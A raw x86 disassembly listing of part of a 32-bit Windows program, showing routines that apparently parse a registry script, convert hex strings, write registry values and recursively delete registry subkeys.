  4037b2:	test   esi,esi
  4037b4:	je     0x4037ff
  4037b6:	mov    esi,DWORD PTR [ebp-0x58]
  4037b9:	cmp    DWORD PTR [ebx],esi
  4037bb:	je     0x4037cb
  4037bd:	push   DWORD PTR [ebx]
  4037bf:	call   DWORD PTR ds:0x4080d8
  4037c5:	mov    DWORD PTR [ebx],eax
  4037c7:	cmp    eax,esi
  4037c9:	jne    0x4037bd
  4037cb:	push   0x25
  4037cd:	pop    esi
  4037ce:	push   DWORD PTR [ebx]
  4037d0:	call   DWORD PTR ds:0x4080d8
  4037d6:	mov    DWORD PTR [ebx],eax
  4037d8:	cmp    WORD PTR [eax],di
  4037db:	jne    0x40370c
  4037e1:	mov    ecx,DWORD PTR [ebp-0x54]
  4037e4:	mov    eax,DWORD PTR [ebp-0x48]
  4037e7:	mov    DWORD PTR [ebp-0x48],edi
  4037ea:	mov    DWORD PTR [ecx],eax
  4037ec:	jmp    0x403804
  4037ee:	mov    edi,0x80004005
  4037f3:	jmp    0x403804
  4037f5:	mov    edi,0x80020009
  4037fa:	jmp    0x403804
  4037fc:	mov    DWORD PTR [ebp-0x48],edi
  4037ff:	mov    edi,0x8007000e
  403804:	push   DWORD PTR [ebp-0x48]
  403807:	call   DWORD PTR ds:0x408198
  40380d:	mov    eax,edi
  40380f:	pop    edi
  403810:	jmp    0x403817
  403812:	mov    eax,0x80004003
  403817:	mov    ecx,DWORD PTR [ebp-0x4]
  40381a:	pop    esi
  40381b:	xor    ecx,ebp
  40381d:	pop    ebx
  40381e:	call   0x406340
  403823:	mov    esp,ebp
  403825:	pop    ebp
  403826:	ret    0x8
  403829:	int3   
  40382a:	int3   
  40382b:	int3   
  40382c:	int3   
  40382d:	int3   
  40382e:	mov    edi,edi
  403830:	push   esi
  403831:	mov    eax,ecx
  403833:	xor    esi,esi
  403835:	push   edi
  403836:	mov    di,dx
  403839:	test   eax,eax
  40383b:	jne    0x40384b
  40383d:	jmp    0x403859
  40383f:	cmp    cx,di
  403842:	je     0x403855
  403844:	push   eax
  403845:	call   DWORD PTR ds:0x4080d8
  40384b:	movzx  ecx,WORD PTR [eax]
  40384e:	test   cx,cx
  403851:	jne    0x40383f
  403853:	jmp    0x403857
  403855:	mov    esi,eax
  403857:	mov    eax,esi
  403859:	pop    edi
  40385a:	pop    esi
  40385b:	ret    
  40385c:	int3   
  40385d:	int3   
  40385e:	int3   
  40385f:	int3   
  403860:	int3   
  403861:	mov    eax,ds:0x407420
  403866:	push   ebx
  403867:	mov    ebx,edx
  403869:	push   esi
  40386a:	push   edi
  40386b:	mov    edi,ecx
  40386d:	test   al,0x1
  40386f:	jne    0x4038c7
  403871:	or     eax,0x1
  403874:	mov    DWORD PTR ds:0x407424,0x401174
  40387e:	push   0x8
  403880:	mov    ds:0x407420,eax
  403885:	pop    eax
  403886:	mov    ds:0x407428,ax
  40388c:	mov    eax,0x4008
  403891:	push   0x13
  403893:	mov    ds:0x407430,ax
  403899:	pop    eax
  40389a:	push   0x11
  40389c:	mov    ds:0x407438,ax
  4038a2:	pop    eax
  4038a3:	mov    DWORD PTR ds:0x40742c,0x401178
  4038ad:	mov    DWORD PTR ds:0x407434,0x40117c
  4038b7:	mov    DWORD PTR ds:0x40743c,0x401180
  4038c1:	mov    ds:0x407440,ax
  4038c7:	xor    esi,esi
  4038c9:	push   DWORD PTR [esi*8+0x407424]
  4038d0:	push   edi
  4038d1:	call   DWORD PTR ds:0x408034
  4038d7:	test   eax,eax
  4038d9:	je     0x4038e5
  4038db:	inc    esi
  4038dc:	cmp    esi,0x4
  4038df:	jb     0x4038c9
  4038e1:	xor    eax,eax
  4038e3:	jmp    0x4038f3
  4038e5:	mov    cx,WORD PTR [esi*8+0x407428]
  4038ed:	xor    eax,eax
  4038ef:	mov    WORD PTR [ebx],cx
  4038f2:	inc    eax
  4038f3:	pop    edi
  4038f4:	pop    esi
  4038f5:	pop    ebx
  4038f6:	ret    
  4038f7:	int3   
  4038f8:	int3   
  4038f9:	int3   
  4038fa:	int3   
  4038fb:	int3   
  4038fc:	mov    edi,edi
  4038fe:	push   ebp
  4038ff:	mov    ebp,esp
  403901:	push   ecx
  403902:	push   ecx
  403903:	mov    edx,DWORD PTR [ebp+0xc]
  403906:	push   ebx
  403907:	mov    ebx,ecx
  403909:	push   esi
  40390a:	push   edi
  40390b:	test   edx,edx
  40390d:	je     0x403958
  40390f:	xor    eax,eax
  403911:	mov    edi,edx
  403913:	mov    DWORD PTR [ebp-0x4],eax
  403916:	mov    esi,eax
  403918:	mov    ecx,edi
  40391a:	lea    eax,[ecx+0x2]
  40391d:	mov    DWORD PTR [ebp-0x8],eax
  403920:	mov    ax,WORD PTR [ecx]
  403923:	add    ecx,0x2
  403926:	cmp    ax,WORD PTR [ebp-0x4]
  40392a:	jne    0x403920
  40392c:	sub    ecx,DWORD PTR [ebp-0x8]
  40392f:	sar    ecx,1
  403931:	inc    ecx
  403932:	lea    edi,[edi+ecx*2]
  403935:	lea    esi,[esi+ecx*2]
  403938:	cmp    ecx,0x1
  40393b:	jne    0x403918
  40393d:	push   esi
  40393e:	push   edx
  40393f:	push   0x7
  403941:	xor    eax,eax
  403943:	push   eax
  403944:	push   DWORD PTR [ebp+0x8]
  403947:	push   DWORD PTR [ebx]
  403949:	call   DWORD PTR ds:0x408010
  40394f:	pop    edi
  403950:	pop    esi
  403951:	pop    ebx
  403952:	mov    esp,ebp
  403954:	pop    ebp
  403955:	ret    0x8
  403958:	mov    ecx,0x80004005
  40395d:	call   0x403da4
  403962:	int3   
  403963:	int3   
  403964:	int3   
  403965:	int3   
  403966:	int3   
  403967:	int3   
  403968:	mov    edi,edi
  40396a:	push   esi
  40396b:	mov    esi,ecx
  40396d:	jmp    0x40397d
  40396f:	mov    edx,DWORD PTR [esi]
  403971:	push   edx
  403972:	mov    eax,DWORD PTR [edx]
  403974:	mov    DWORD PTR [esi],eax
  403976:	call   DWORD PTR ds:0x40813c
  40397c:	pop    ecx
  40397d:	cmp    DWORD PTR [esi],0x0
  403980:	jne    0x40396f
  403982:	pop    esi
  403983:	ret    
  403984:	int3   
  403985:	int3   
  403986:	int3   
  403987:	int3   
  403988:	int3   
  403989:	mov    edi,edi
  40398b:	push   ebp
  40398c:	mov    ebp,esp
  40398e:	mov    eax,0x2120
  403993:	call   0x406bf0
  403998:	mov    eax,ds:0x407008
  40399d:	xor    eax,ebp
  40399f:	mov    DWORD PTR [ebp-0x4],eax
  4039a2:	mov    eax,DWORD PTR [ebp+0x8]
  4039a5:	mov    DWORD PTR [ebp-0x211c],eax
  4039ab:	mov    eax,DWORD PTR [ebp+0xc]
  4039ae:	mov    DWORD PTR [ebp-0x2118],eax
  4039b4:	mov    eax,DWORD PTR [ebp+0x10]
  4039b7:	mov    DWORD PTR [ebp-0x2120],eax
  4039bd:	xor    eax,eax
  4039bf:	push   esi
  4039c0:	mov    WORD PTR [ebp-0x210c],ax
  4039c7:	mov    esi,ecx
  4039c9:	lea    eax,[ebp-0x2004]
  4039cf:	mov    DWORD PTR [ebp-0x2110],esi
  4039d5:	push   eax
  4039d6:	call   0x4040e1
  4039db:	test   eax,eax
  4039dd:	js     0x403d70
  4039e3:	lea    edx,[ebp-0x210c]
  4039e9:	lea    ecx,[ebp-0x2004]
  4039ef:	call   0x403861
  4039f4:	test   eax,eax
  4039f6:	jne    0x403a02
  4039f8:	mov    eax,0x80020009
  4039fd:	jmp    0x403d70
  403a02:	mov    ecx,esi
  403a04:	call   0x4047dd
  403a09:	lea    eax,[ebp-0x2004]
  403a0f:	mov    ecx,esi
  403a11:	push   eax
  403a12:	call   0x4040e1
  403a17:	test   eax,eax
  403a19:	js     0x403d70
  403a1f:	movzx  eax,WORD PTR [ebp-0x210c]
  403a26:	push   ebx
  403a27:	push   edi
  403a28:	push   0x2
  403a2a:	pop    edi
  403a2b:	sub    eax,0x8
  403a2e:	je     0x403d15
  403a34:	sub    eax,0x9
  403a37:	je     0x403bb6
  403a3d:	sub    eax,edi
  403a3f:	je     0x403b5d
  403a45:	sub    eax,0x3ff5
  403a4a:	jne    0x403d5b
  403a50:	lea    ecx,[ebp-0x2004]
  403a56:	xor    ebx,ebx
  403a58:	lea    edx,[ecx+0x2]
  403a5b:	mov    ax,WORD PTR [ecx]
  403a5e:	add    ecx,edi
  403a60:	cmp    ax,bx
  403a63:	jne    0x403a5b
  403a65:	sub    ecx,edx
  403a67:	mov    DWORD PTR [ebp-0x2108],ebx
  403a6d:	sar    ecx,1
  403a6f:	lea    eax,[ecx+0x2]
  403a72:	mul    edi
  403a74:	cmp    edx,ebx
  403a76:	ja     0x403d81
  403a7c:	cmp    eax,0xffffffff
  403a7f:	ja     0x403d81
  403a85:	cmp    eax,0x100
  403a8a:	jbe    0x403aa0
  403a8c:	push   eax
  403a8d:	lea    ecx,[ebp-0x2108]
  403a93:	call   0x403522
  403a98:	mov    esi,DWORD PTR [ebp-0x2108]
  403a9e:	jmp    0x403aac
  403aa0:	lea    esi,[ebp-0x2104]
  403aa6:	mov    DWORD PTR [ebp-0x2108],esi
  403aac:	test   esi,esi
  403aae:	je     0x403b2b
  403ab0:	cmp    WORD PTR [ebp-0x2004],bx
  403ab7:	lea    eax,[ebp-0x2004]
  403abd:	mov    DWORD PTR [ebp-0x210c],eax
  403ac3:	je     0x403b06
  403ac5:	push   eax
  403ac6:	call   DWORD PTR ds:0x4080d8
  403acc:	mov    ecx,eax
  403ace:	mov    eax,DWORD PTR [ebp-0x210c]
  403ad4:	movzx  edx,WORD PTR [eax]
  403ad7:	cmp    edx,0x5c
  403ada:	jne    0x403afa
  403adc:	push   0x30
  403ade:	pop    eax
  403adf:	cmp    WORD PTR [ecx],ax
  403ae2:	mov    eax,DWORD PTR [ebp-0x210c]
  403ae8:	jne    0x403afa
  403aea:	xor    eax,eax
  403aec:	mov    WORD PTR [esi],ax
  403aef:	add    esi,edi
  403af1:	push   ecx
  403af2:	call   DWORD PTR ds:0x4080d8
  403af8:	jmp    0x403b01
  403afa:	mov    WORD PTR [esi],dx
  403afd:	add    esi,edi
  403aff:	add    eax,edi
  403b01:	cmp    WORD PTR [eax],bx
  403b04:	jmp    0x403abd
  403b06:	mov    ecx,DWORD PTR [ebp-0x211c]
  403b0c:	xor    eax,eax
  403b0e:	mov    DWORD PTR [esi],eax
  403b10:	push   DWORD PTR [ebp-0x2108]
  403b16:	push   DWORD PTR [ebp-0x2118]
  403b1c:	call   0x4038fc
  403b21:	mov    esi,DWORD PTR [ebp-0x2108]
  403b27:	mov    edi,eax
  403b29:	jmp    0x403b2e
  403b2b:	push   0xe
  403b2d:	pop    edi
  403b2e:	lea    eax,[ebp-0x2104]
  403b34:	cmp    esi,eax
  403b36:	je     0x403b43
  403b38:	lea    ecx,[ebp-0x2108]
  403b3e:	call   0x403513
  403b43:	mov    esi,DWORD PTR [ebp-0x2110]
  403b49:	test   edi,edi
  403b4b:	je     0x403d5b
  403b51:	mov    ecx,edi
  403b53:	call   0x4040cc
  403b58:	jmp    0x403d6e
  403b5d:	lea    eax,[ebp-0x2110]
  403b63:	xor    ebx,ebx
  403b65:	push   eax
  403b66:	push   ebx
  403b67:	push   ebx
  403b68:	lea    eax,[ebp-0x2004]
  403b6e:	mov    DWORD PTR [ebp-0x2114],ebx
  403b74:	push   eax
  403b75:	call   DWORD PTR ds:0x4080d0
  403b7b:	mov    eax,DWORD PTR [ebp-0x2110]
  403b81:	push   0x4
  403b83:	mov    DWORD PTR [ebp-0x210c],eax
  403b89:	lea    eax,[ebp-0x210c]
  403b8f:	push   eax
  403b90:	mov    eax,DWORD PTR [ebp-0x211c]
  403b96:	push   0x4
  403b98:	push   ebx
  403b99:	push   DWORD PTR [ebp-0x2118]
  403b9f:	push   DWORD PTR [eax]
  403ba1:	call   DWORD PTR ds:0x408010
  403ba7:	lea    ecx,[ebp-0x2114]
  403bad:	mov    edi,eax
  403baf:	call   0x403968
  403bb4:	jmp    0x403b49
  403bb6:	lea    ecx,[ebp-0x2004]
  403bbc:	xor    ebx,ebx
  403bbe:	lea    edx,[ecx+0x2]
  403bc1:	mov    ax,WORD PTR [ecx]
  403bc4:	add    ecx,edi
  403bc6:	cmp    ax,bx
  403bc9:	jne    0x403bc1
  403bcb:	sub    ecx,edx
  403bcd:	sar    ecx,1
  403bcf:	mov    DWORD PTR [ebp-0x2114],ecx
  403bd5:	test   cl,0x1
  403bd8:	jne    0x403c41
  403bda:	mov    eax,ecx
  403bdc:	mov    DWORD PTR [ebp-0x2108],ebx
  403be2:	cdq    
  403be3:	sub    eax,edx
  403be5:	mov    edi,eax
  403be7:	sar    edi,1
  403be9:	mov    DWORD PTR [ebp-0x210c],edi
  403bef:	cmp    ebx,ebx
  403bf1:	ja     0x403d81
  403bf7:	cmp    edi,0xffffffff
  403bfa:	ja     0x403d81
  403c00:	cmp    edi,0x100
  403c06:	jbe    0x403c1c
  403c08:	push   edi
  403c09:	lea    ecx,[ebp-0x2108]
  403c0f:	call   0x403522
  403c14:	mov    eax,DWORD PTR [ebp-0x2108]
  403c1a:	jmp    0x403c28
  403c1c:	lea    eax,[ebp-0x2104]
  403c22:	mov    DWORD PTR [ebp-0x2108],eax
  403c28:	test   eax,eax
  403c2a:	jne    0x403c4b
  403c2c:	lea    eax,[ebp-0x2104]
  403c32:	test   eax,eax
  403c34:	je     0x403c41
  403c36:	lea    ecx,[ebp-0x2108]
  403c3c:	call   0x403513
  403c41:	mov    eax,0x80004005
  403c46:	jmp    0x403d6e
  403c4b:	push   edi
  403c4c:	push   ebx
  403c4d:	push   eax
  403c4e:	call   0x406692
  403c53:	mov    esi,DWORD PTR [ebp-0x2114]
  403c59:	add    esp,0xc
  403c5c:	test   esi,esi
  403c5e:	jle    0x403cd3
  403c60:	push   0x30
  403c62:	pop    ecx
  403c63:	mov    edi,ebx
  403c65:	mov    eax,edi
  403c67:	cdq    
  403c68:	sub    eax,edx
  403c6a:	movzx  edx,WORD PTR [ebp+edi*2-0x2004]
  403c72:	sar    eax,1
  403c74:	add    eax,DWORD PTR [ebp-0x2108]
  403c7a:	mov    DWORD PTR [ebp-0x2114],eax
  403c80:	mov    eax,edx
  403c82:	cmp    eax,ecx
  403c84:	jl     0x403cac
  403c86:	cmp    eax,0x39
  403c89:	jle    0x403ca7
  403c8b:	cmp    eax,0x40
  403c8e:	jle    0x403cac
  403c90:	cmp    eax,0x46
  403c93:	jle    0x403ca2
  403c95:	add    eax,0xffffff9f
  403c98:	cmp    eax,0x5
  403c9b:	ja     0x403cac
  403c9d:	sub    dl,0x57
  403ca0:	jmp    0x403cae
  403ca2:	sub    dl,0x37
  403ca5:	jmp    0x403cae
  403ca7:	sub    dl,0x30
  403caa:	jmp    0x403cae
  403cac:	mov    dl,bl
  403cae:	mov    eax,edi
  403cb0:	and    eax,0x1
  403cb3:	push   0x4
  403cb5:	shl    eax,0x2
  403cb8:	pop    ecx
  403cb9:	sub    ecx,eax
  403cbb:	mov    eax,DWORD PTR [ebp-0x2114]
  403cc1:	shl    dl,cl
  403cc3:	push   0x30
  403cc5:	pop    ecx
  403cc6:	or     BYTE PTR [eax],dl
  403cc8:	inc    edi
  403cc9:	cmp    edi,esi
  403ccb:	jl     0x403c65
  403ccd:	mov    edi,DWORD PTR [ebp-0x210c]
  403cd3:	mov    eax,DWORD PTR [ebp-0x211c]
  403cd9:	push   edi
  403cda:	push   DWORD PTR [ebp-0x2108]
  403ce0:	push   0x3
  403ce2:	push   ebx
  403ce3:	push   DWORD PTR [ebp-0x2118]
  403ce9:	push   DWORD PTR [eax]
  403ceb:	call   DWORD PTR ds:0x408010
  403cf1:	mov    edi,eax
  403cf3:	lea    eax,[ebp-0x2104]
  403cf9:	cmp    DWORD PTR [ebp-0x2108],eax
  403cff:	je     0x403b43
  403d05:	lea    ecx,[ebp-0x2108]
  403d0b:	call   0x403513
  403d10:	jmp    0x403b43
  403d15:	lea    ecx,[ebp-0x2004]
  403d1b:	xor    ebx,ebx
  403d1d:	lea    edx,[ecx+0x2]
  403d20:	mov    ax,WORD PTR [ecx]
  403d23:	add    ecx,edi
  403d25:	cmp    ax,bx
  403d28:	jne    0x403d20
  403d2a:	sub    ecx,edx
  403d2c:	sar    ecx,1
  403d2e:	lea    eax,[ecx*2+0x2]
  403d35:	push   eax
  403d36:	lea    eax,[ebp-0x2004]
  403d3c:	push   eax
  403d3d:	mov    eax,DWORD PTR [ebp-0x211c]
  403d43:	push   0x1
  403d45:	push   ebx
  403d46:	push   DWORD PTR [ebp-0x2118]
  403d4c:	push   DWORD PTR [eax]
  403d4e:	call   DWORD PTR ds:0x408010
  403d54:	mov    edi,eax
  403d56:	jmp    0x403b49
  403d5b:	push   DWORD PTR [ebp-0x2120]
  403d61:	mov    ecx,esi
  403d63:	call   0x4040e1
  403d68:	test   eax,eax
  403d6a:	js     0x403d6e
  403d6c:	xor    eax,eax
  403d6e:	pop    edi
  403d6f:	pop    ebx
  403d70:	mov    ecx,DWORD PTR [ebp-0x4]
  403d73:	xor    ecx,ebp
  403d75:	pop    esi
  403d76:	call   0x406340
  403d7b:	mov    esp,ebp
  403d7d:	pop    ebp
  403d7e:	ret    0xc
  403d81:	mov    ecx,0x80070057
  403d86:	call   0x403da4
  403d8b:	int3   
  403d8c:	int3   
  403d8d:	int3   
  403d8e:	int3   
  403d8f:	int3   
  403d90:	int3   
  403d91:	push   0x0
  403d93:	push   0x0
  403d95:	push   0x1
  403d97:	push   ecx
  403d98:	call   DWORD PTR ds:0x408038
  403d9e:	ret    
  403d9f:	int3   
  403da0:	int3   
  403da1:	int3   
  403da2:	int3   
  403da3:	int3   
  403da4:	xor    eax,eax
  403da6:	cmp    ecx,0x8007000e
  403dac:	sete   al
  403daf:	lea    ecx,[eax-0x1]
  403db2:	and    ecx,0x6
  403db5:	add    ecx,0xc0000017
  403dbb:	jmp    0x403d91
  403dc0:	int3   
  403dc1:	int3   
  403dc2:	int3   
  403dc3:	int3   
  403dc4:	int3   
  403dc5:	test   ecx,ecx
  403dc7:	je     0x403df5
  403dc9:	cmp    ecx,0xc
  403dcc:	je     0x403dee
  403dce:	cmp    ecx,0x16
  403dd1:	je     0x403de7
  403dd3:	cmp    ecx,0x22
  403dd6:	je     0x403de7
  403dd8:	cmp    ecx,0x50
  403ddb:	je     0x403df5
  403ddd:	mov    ecx,0x80004005
  403de2:	jmp    0x403da4
  403de7:	mov    ecx,0x80070057
  403dec:	jmp    0x403de2
  403dee:	mov    ecx,0x8007000e
  403df3:	jmp    0x403de2
  403df5:	mov    eax,ecx
  403df7:	ret    
  403df8:	int3   
  403df9:	int3   
  403dfa:	int3   
  403dfb:	int3   
  403dfc:	int3   
  403dfd:	mov    edi,edi
  403dff:	push   ebp
  403e00:	mov    ebp,esp
  403e02:	mov    eax,0x2004
  403e07:	call   0x406bf0
  403e0c:	mov    eax,ds:0x407008
  403e11:	xor    eax,ebp
  403e13:	mov    DWORD PTR [ebp-0x4],eax
  403e16:	push   esi
  403e17:	push   edi
  403e18:	mov    edi,DWORD PTR [ebp+0x8]
  403e1b:	mov    esi,ecx
  403e1d:	cmp    WORD PTR [edi],0x3d
  403e21:	jne    0x403e52
  403e23:	push   edi
  403e24:	call   0x4040e1
  403e29:	test   eax,eax
  403e2b:	js     0x403e54
  403e2d:	mov    ecx,esi
  403e2f:	call   0x4047dd
  403e34:	lea    eax,[ebp-0x2004]
  403e3a:	mov    ecx,esi
  403e3c:	push   eax
  403e3d:	call   0x4040e1
  403e42:	test   eax,eax
  403e44:	js     0x403e54
  403e46:	push   edi
  403e47:	mov    ecx,esi
  403e49:	call   0x4040e1
  403e4e:	test   eax,eax
  403e50:	js     0x403e54
  403e52:	xor    eax,eax
  403e54:	mov    ecx,DWORD PTR [ebp-0x4]
  403e57:	pop    edi
  403e58:	xor    ecx,ebp
  403e5a:	pop    esi
  403e5b:	call   0x406340
  403e60:	mov    esp,ebp
  403e62:	pop    ebp
  403e63:	ret    0x4
  403e66:	int3   
  403e67:	int3   
  403e68:	int3   
  403e69:	int3   
  403e6a:	int3   
  403e6b:	mov    edi,edi
  403e6d:	push   ebp
  403e6e:	mov    ebp,esp
  403e70:	push   esi
  403e71:	mov    esi,0x40129c
  403e76:	push   DWORD PTR [esi]
  403e78:	push   DWORD PTR [ebp+0x8]
  403e7b:	call   DWORD PTR ds:0x408034
  403e81:	test   eax,eax
  403e83:	je     0x403e95
  403e85:	add    esi,0x4
  403e88:	cmp    esi,0x4012cc
  403e8e:	jl     0x403e76
  403e90:	xor    eax,eax
  403e92:	inc    eax
  403e93:	jmp    0x403e97
  403e95:	xor    eax,eax
  403e97:	pop    esi
  403e98:	pop    ebp
  403e99:	ret    0x4
  403e9c:	int3   
  403e9d:	int3   
  403e9e:	int3   
  403e9f:	int3   
  403ea0:	int3   
  403ea1:	mov    edi,edi
  403ea3:	push   ebp
  403ea4:	mov    ebp,esp
  403ea6:	sub    esp,0x228
  403eac:	mov    eax,ds:0x407008
  403eb1:	xor    eax,ebp
  403eb3:	mov    DWORD PTR [ebp-0x8],eax
  403eb6:	push   ebx
  403eb7:	mov    ebx,DWORD PTR [ebp+0x8]
  403eba:	lea    eax,[ebp-0x220]
  403ec0:	push   esi
  403ec1:	push   edi
  403ec2:	push   eax
  403ec3:	mov    edi,ecx
  403ec5:	xor    ecx,ecx
  403ec7:	push   0x2001f
  403ecc:	push   ecx
  403ecd:	push   ebx
  403ece:	push   DWORD PTR [edi]
  403ed0:	mov    DWORD PTR [ebp-0x218],ecx
  403ed6:	mov    DWORD PTR [ebp-0x214],ecx
  403edc:	mov    DWORD PTR [ebp-0x210],ecx
  403ee2:	mov    DWORD PTR [ebp-0x220],ecx
  403ee8:	call   DWORD PTR ds:0x40800c
  403eee:	mov    esi,eax
  403ef0:	test   esi,esi
  403ef2:	jne    0x403fae
  403ef8:	cmp    DWORD PTR [ebp-0x218],esi
  403efe:	je     0x403f0e
  403f00:	push   DWORD PTR [ebp-0x218]
  403f06:	call   DWORD PTR ds:0x408000
  403f0c:	mov    esi,eax
  403f0e:	mov    eax,DWORD PTR [ebp-0x220]
  403f14:	mov    DWORD PTR [ebp-0x218],eax
  403f1a:	test   esi,esi
  403f1c:	jne    0x403fae
  403f22:	lea    ecx,[ebp-0x228]
  403f28:	push   ecx
  403f29:	push   esi
  403f2a:	push   esi
  403f2b:	push   esi
  403f2c:	lea    ecx,[ebp-0x21c]
  403f32:	push   ecx
  403f33:	lea    ecx,[ebp-0x20c]
  403f39:	push   ecx
  403f3a:	push   esi
  403f3b:	push   eax
  403f3c:	jmp    0x403f75
  403f3e:	lea    eax,[ebp-0x20c]
  403f44:	push   eax
  403f45:	lea    ecx,[ebp-0x218]
  403f4b:	call   0x403ea1
  403f50:	mov    esi,eax
  403f52:	test   esi,esi
  403f54:	jne    0x403fae
  403f56:	lea    eax,[ebp-0x228]
  403f5c:	push   eax
  403f5d:	push   esi
  403f5e:	push   esi
  403f5f:	push   esi
  403f60:	lea    eax,[ebp-0x21c]
  403f66:	push   eax
  403f67:	lea    eax,[ebp-0x20c]
  403f6d:	push   eax
  403f6e:	push   esi
  403f6f:	push   DWORD PTR [ebp-0x218]
  403f75:	mov    DWORD PTR [ebp-0x21c],0x100
  403f7f:	call   DWORD PTR ds:0x408008
  403f85:	test   eax,eax
  403f87:	je     0x403f3e
  403f89:	cmp    DWORD PTR [ebp-0x218],0x0
  403f90:	je     0x403fa4
  403f92:	push   DWORD PTR [ebp-0x218]
  403f98:	call   DWORD PTR ds:0x408000
  403f9e:	mov    DWORD PTR [ebp-0x218],esi
  403fa4:	push   ebx
  403fa5:	mov    ecx,edi
  403fa7:	call   0x40401b
  403fac:	mov    esi,eax
  403fae:	cmp    DWORD PTR [ebp-0x218],0x0
  403fb5:	je     0x403fc3
  403fb7:	push   DWORD PTR [ebp-0x218]
  403fbd:	call   DWORD PTR ds:0x408000
  403fc3:	mov    ecx,DWORD PTR [ebp-0x8]
  403fc6:	mov    eax,esi
  403fc8:	pop    edi
  403fc9:	pop    esi
  403fca:	xor    ecx,ebp
  403fcc:	pop    ebx
  403fcd:	call   0x406340
  403fd2:	mov    esp,ebp
  403fd4:	pop    ebp
  403fd5:	ret    0x4
  403fd8:	int3   
  403fd9:	int3   
  403fda:	int3   
  403fdb:	int3   
  403fdc:	int3   
  403fdd:	mov    edi,edi
  403fdf:	push   ebp
  403fe0:	mov    ebp,esp
  403fe2:	push   ecx
  403fe3:	xor    ecx,ecx
  403fe5:	lea    eax,[ebp-0x4]
  403fe8:	push   ecx
  403fe9:	push   ecx
  403fea:	push   ecx
  403feb:	push   ecx
  403fec:	push   ecx
  403fed:	push   ecx
  403fee:	push   ecx
  403fef:	push   eax
  403ff0:	push   ecx
  403ff1:	push   ecx
  403ff2:	push   ecx
  403ff3:	push   DWORD PTR [ebp+0x8]
  403ff6:	mov    DWORD PTR [ebp-0x4],ecx
  403ff9:	call   DWORD PTR ds:0x408004
  403fff:	test   eax,eax
  404001:	je     0x404007
  404003:	xor    eax,eax
  404005:	jmp    0x404010
  404007:	xor    eax,eax
  404009:	cmp    eax,DWORD PTR [ebp-0x4]
  40400c:	sbb    eax,eax
  40400e:	neg    eax
  404010:	mov    esp,ebp
  404012:	pop    ebp
  404013:	ret    0x4
  404016:	int3   
  404017:	int3   
  404018:	int3   
  404019:	int3   
  40401a:	int3   
  40401b:	mov    edi,edi
  40401d:	push   ebp
  40401e:	mov    ebp,esp
  404020:	push   ecx
  404021:	mov    eax,ds:0x407008
  404026:	xor    eax,ebp
  404028:	mov    DWORD PTR [ebp-0x4],eax
  40402b:	push   ebx
  40402c:	push   esi
  40402d:	mov    esi,ecx
  40402f:	xor    ebx,ebx
  404031:	push   edi
  404032:	cmp    DWORD PTR [esi+0x4],ebx
  404035:	jne    0x40407c
  404037:	cmp    DWORD PTR [esi+0x8],ebx
  40403a:	jne    0x40407c
  40403c:	push   0x4016c8
  404041:	call   DWORD PTR ds:0x408030
  404047:	test   eax,eax
  404049:	je     0x40405c
  40404b:	push   0x40171c
  404050:	push   eax
  404051:	call   DWORD PTR ds:0x408028
  404057:	mov    DWORD PTR [esi+0x4],eax
  40405a:	jmp    0x40407c
  40405c:	push   ebx
  40405d:	push   ebx
  40405e:	push   0x40172c
  404063:	call   DWORD PTR ds:0x40802c
  404069:	test   eax,eax
  40406b:	je     0x40407c
  40406d:	push   0x401748
  404072:	push   eax
  404073:	call   DWORD PTR ds:0x408028
  404079:	mov    DWORD PTR [esi+0x8],eax
  40407c:	mov    edi,DWORD PTR [esi+0x4]
  40407f:	test   edi,edi
  404081:	je     0x404096
  404083:	push   ebx
  404084:	push   ebx
  404085:	push   DWORD PTR [ebp+0x8]
  404088:	mov    ecx,edi
  40408a:	push   DWORD PTR [esi]
  40408c:	call   DWORD PTR ds:0x4081a0
  404092:	call   edi
  404094:	jmp    0x4040b4
  404096:	mov    edi,DWORD PTR [esi+0x8]
  404099:	test   edi,edi
  40409b:	je     0x4040ae
  40409d:	push   DWORD PTR [ebp+0x8]
  4040a0:	mov    ecx,edi
  4040a2:	push   DWORD PTR [esi]
  4040a4:	call   DWORD PTR ds:0x4081a0
  4040aa:	call   edi
  4040ac:	jmp    0x4040b4
  4040ae:	call   DWORD PTR ds:0x408024
  4040b4:	mov    ecx,DWORD PTR [ebp-0x4]
  4040b7:	pop    edi
  4040b8:	pop    esi
  4040b9:	xor    ecx,ebp
  4040bb:	pop    ebx
  4040bc:	call   0x406340
  4040c1:	mov    esp,ebp
  4040c3:	pop    ebp
  4040c4:	ret    0x4
  4040c7:	int3   
  4040c8:	int3   
  4040c9:	int3   
  4040ca:	int3   
  4040cb:	int3   
  4040cc:	test   ecx,ecx
  4040ce:	jle    0x4040d9
  4040d0:	movzx  ecx,cx
  4040d3:	or     ecx,0x80070000
  4040d9:	mov    eax,ecx
  4040db:	ret    
  4040dc:	int3   
  4040dd:	int3   
  4040de:	int3   
  4040df:	int3   
  4040e0:	int3   
  4040e1:	mov    edi,edi
  4040e3:	push   ebp
  4040e4:	mov    ebp,esp
  4040e6:	push   ecx
  4040e7:	push   edi
  4040e8:	mov    edi,ecx
  4040ea:	call   0x4047dd
  4040ef:	mov    ecx,DWORD PTR [edi]
  4040f1:	xor    edx,edx
  4040f3:	movzx  eax,WORD PTR [ecx]
  4040f6:	cmp    dx,ax
  4040f9:	jne    0x404105
  4040fb:	mov    eax,0x80020009
  404100:	jmp    0x40421a
  404105:	push   ebx
  404106:	push   esi
  404107:	mov    esi,DWORD PTR [ebp+0x8]
  40410a:	push   0x27
  40410c:	pop    edx
  40410d:	lea    ebx,[esi+0x2000]
  404113:	mov    DWORD PTR [ebp-0x4],ebx
  404116:	cmp    dx,ax
  404119:	jne    0x4041b4
  40411f:	push   ecx
  404120:	call   DWORD PTR ds:0x4080d8
  404126:	xor    ecx,ecx
  404128:	mov    DWORD PTR [edi],eax
  40412a:	cmp    cx,WORD PTR [eax]
  40412d:	je     0x404196
  40412f:	mov    eax,DWORD PTR [edi]
  404131:	push   0x27
  404133:	pop    ebx
  404134:	cmp    bx,WORD PTR [eax]
  404137:	jne    0x404145
  404139:	push   eax
  40413a:	call   DWORD PTR ds:0x4080d8
  404140:	cmp    bx,WORD PTR [eax]
  404143:	jne    0x404193
  404145:	mov    eax,DWORD PTR [edi]
  404147:	cmp    bx,WORD PTR [eax]
  40414a:	jne    0x404155
  40414c:	push   eax
  40414d:	call   DWORD PTR ds:0x4080d8
  404153:	mov    DWORD PTR [edi],eax
  404155:	mov    ebx,DWORD PTR [edi]
  404157:	push   ebx
  404158:	call   DWORD PTR ds:0x4080d8
  40415e:	mov    edx,eax
  404160:	mov    DWORD PTR [edi],edx
  404162:	sub    edx,ebx
